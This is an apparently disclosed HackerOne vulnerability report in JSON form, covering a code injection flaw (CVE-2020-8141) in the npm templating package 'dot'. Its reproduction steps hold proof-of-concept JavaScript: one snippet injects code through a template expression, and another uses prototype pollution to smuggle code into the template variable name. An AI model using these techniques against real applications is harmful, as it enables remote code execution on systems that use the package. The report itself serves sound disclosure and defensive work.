{
  "id": 390929,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTA5Mjk=",
  "url": "https://hackerone.com/reports/390929",
  "title": "Code Injection Vulnerability in dot Package",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-08-06T14:28:24.711Z",
  "submitted_at": "2018-08-06T14:28:24.711Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "cris_semmle",
    "url": "/cris_semmle",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/320/894/63a7168e6cfdfe973d7e4efc96fbc6088b092fd2_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2020-8141"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-04-03T10:16:35.485Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-03-04T10:16:33.995Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report a code injection vulnerability in dot.\nIt allows attackers to execute arbitrary JS code, especially when combined with a prototype pollution attack.\n\n# Module\n\n**module name:** dot\n**version:** 1.1.2\n**npm page:** `https://www.npmjs.com/package/dot`\n\n## Module Description\n\nCreated in search of the fastest and concise JavaScript templating function with emphasis on performance under V8 and nodejs. It shows great performance for both nodejs and browsers.\n\ndoT.js is fast, small and has no dependencies.\n\n## Module Stats\n\n76,838 downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\ndot uses Function() to compile templates. this can be exploited by the attacker if she can control the template or if she can control the value set on Object.prototype.\n\n## Steps To Reproduce:\n\na) The basic attack vector\n```js\nvar doT = require(\"dot\");\nvar tempFn = doT.template(\"<h1>Here is a sample template \" +\n    \"{{=console.log(23)}}</h1>\");\ntempFn({})\n```\nb) in combination with a prototype pollution attack\n - create a folder \"resources\" and inside that a file called \"mytemplate.dot\" with the following content:\n```html\n<h1>Here is a sample template</h1>\n```\n- in the folder containing the resources folder, create and execute the following js file\n```js\nvar doT = require(\"dot\");\n// prototype pollution attack vector\nObject.prototype.templateSettings = {varname:\"a,b,c,d,x=console.log(25)\"};\n// benign looking template compilation + application\nvar dots = require(\"dot\").process({path: \"./resources\"});\ndots.mytemplate();\n```\n\nEven though the template compilation + application looks safe, due to the prototype pollution, the attacker can execute arbitrary commands.\n\n## Patch\n\nN/A remove Function() call\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nThe attacker can achieve code injection/RCE if she can control the template or if she can set arbitrary properties on Object.prototype. Using Function() with runtime computed values is rarely safe.",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-04-03T10:16:34.242Z",
  "allow_singular_disclosure_after": -153543146.78393188,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "sameerphad72",
    "midle",
    "ericwastaken",
    "iamuselesssike"
  ],
  "severity": {
    "rating": "high",
    "score": 7.4,
    "author_type": "User",
    "metrics": {
      "attack_vector": "adjacent",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 22216,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "dot",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
